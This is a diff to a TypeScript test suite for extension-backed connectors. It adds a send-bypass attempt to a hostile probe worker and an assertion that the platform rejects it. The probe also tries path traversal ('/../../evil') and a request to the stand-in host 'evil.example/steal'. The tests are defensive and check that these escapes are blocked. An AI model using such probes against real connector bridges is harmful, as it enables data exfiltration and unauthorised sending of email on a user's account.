@@ -82,10 +82,11 @@ export class TickFacet extends DurableObject {
 
 const EVIL_PROBE_TS = `
 export default {
-  async fetch(_request: Request, env: { CONNECTOR_BRIDGE?: { request: (p: string, path: string) => Promise<unknown> } }): Promise<Response> {
+  async fetch(_request: Request, env: { CONNECTOR_BRIDGE?: { request: (p: string, path: string, init?: { method?: string; body?: string }) => Promise<unknown> } }): Promise<Response> {
     const traversal = await env.CONNECTOR_BRIDGE?.request("gmail", "/../../evil");
     const externalUrl = await env.CONNECTOR_BRIDGE?.request("gmail", "https://evil.example/steal");
-    return Response.json({ traversal, externalUrl });
+    const sendBypass = await env.CONNECTOR_BRIDGE?.request("gmail", "/users/me/messages/send", { method: "POST", body: "{}" });
+    return Response.json({ traversal, externalUrl, sendBypass });
   },
 };
 `.trim();
@@ -251,6 +252,7 @@ describe("schedules and extension-backed connectors", () => {
     const toolText = JSON.stringify(idleMsg.view ?? null);
     expect(toolText).toContain("escaped the allowed provider API prefix");
     expect(toolText).toContain("relative path starting with '/'");
+    expect(toolText).toContain("not permitted for Gmail");
     expect(toolText).toContain('\\"overridden\\":true');
     expect(toolText).toContain("msg-tokyo-2025");
     expect(toolText).toContain("Morning review");
